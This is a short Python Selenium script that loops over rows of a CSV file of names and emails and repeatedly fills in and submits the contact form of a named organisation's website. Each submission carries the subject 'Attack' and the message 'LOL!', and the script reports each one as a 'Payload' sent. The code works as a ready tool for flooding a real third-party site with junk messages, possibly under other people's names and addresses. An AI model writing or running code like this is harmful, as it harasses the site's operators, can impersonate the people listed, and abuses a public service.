from selenium import webdriver
from selenium.webdriver.chrome.service import Service
import time
import csv


path = '/Users/pnalzate/Desktop/BBH/Projects'  # your path goes here
service = Service(executable_path=path)
website =  "https://blackrosefed.org/contact-us-contactenos/"
driver = webdriver.Chrome(service=service)

driver.get(website)
time.sleep(3)

with open('info.csv') as csv_file:
    csv_reader = csv.reader(csv_file, delimiter=',')
    header = next(csv_reader)
    count = 1
    process = []

    for row in csv_reader:
        input_name = driver.find_element(by='xpath',
                                        value=f"//input[contains(@name, 'answer[first_name]')]")
        input_name.send_keys(row[0])

        input_email = driver.find_element(by='xpath',
                                       value=f"//input[contains(@name, 'answer[email]')]")
        input_email.send_keys(row[1])

        input_subject = driver.find_element(by='xpath',
                                       value=f"//input[contains(@name, 'your-subject')]")
        input_subject.send_keys("Attack")

        input_message = driver.find_element(by='xpath',
                                        value=f"//textarea[contains(@name, 'your-message')]")
        input_message.send_keys("LOL!")

        submit_button = driver.find_element(by='xpath', value="//input[contains(@type, 'submit')]")
        submit_button.click()
        
        print(f"Payload {count} has been sent!")
        count += 1

        driver.get(website)

time.sleep(1)
driver.quit()